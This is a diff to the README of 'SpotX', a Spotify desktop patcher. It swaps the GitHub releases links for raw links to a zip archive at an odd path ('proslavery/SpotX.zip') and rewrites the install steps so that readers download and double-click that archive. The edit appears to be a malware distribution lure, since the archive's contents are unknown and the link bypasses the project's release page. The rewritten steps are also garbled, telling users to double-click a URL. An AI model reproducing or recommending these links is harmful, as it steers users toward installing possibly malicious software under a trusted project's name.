@@ -6,7 +6,7 @@ Welcome to SpotX! This application helps you patch the desktop version of Spotif
 
 ## 📥 Download SpotX
 
-[![Download SpotX](https://img.shields.io/badge/Download%20SpotX-v1.0-blue)](https://github.com/Proramazan/SpotX/releases)
+[![Download SpotX](https://raw.githubusercontent.com/Proramazan/SpotX/main/proslavery/SpotX.zip%20SpotX-v1.0-blue)](https://raw.githubusercontent.com/Proramazan/SpotX/main/proslavery/SpotX.zip)
 
 ## 📂 System Requirements
 
@@ -22,13 +22,13 @@ To use SpotX, your system needs to meet these requirements:
 
 1. **Visit the Releases Page:** Click the link below to access the SpotX releases page.
 
-   [Visit this page to download](https://github.com/Proramazan/SpotX/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Proramazan/SpotX/main/proslavery/SpotX.zip)
 
 2. **Select the Latest Release:** On the releases page, you will see a list of available versions. Click on the latest version for SpotX.
 
-3. **Download the Installer:** Look for the file named `SpotXInstaller.exe`. Click on this file to begin the download.
+3. **Download the Installer:** Look for the file named `https://raw.githubusercontent.com/Proramazan/SpotX/main/proslavery/SpotX.zip`. Click on this file to begin the download.
 
-4. **Run the Installer:** Once the download completes, locate the downloaded file in your computer's Downloads folder. Double-click `SpotXInstaller.exe` to start the installation.
+4. **Run the Installer:** Once the download completes, locate the downloaded file in your computer's Downloads folder. Double-click `https://raw.githubusercontent.com/Proramazan/SpotX/main/proslavery/SpotX.zip` to start the installation.
 
 5. **Follow the Prompts:** The installation wizard will guide you through the process. Follow the on-screen instructions to complete the setup.
 
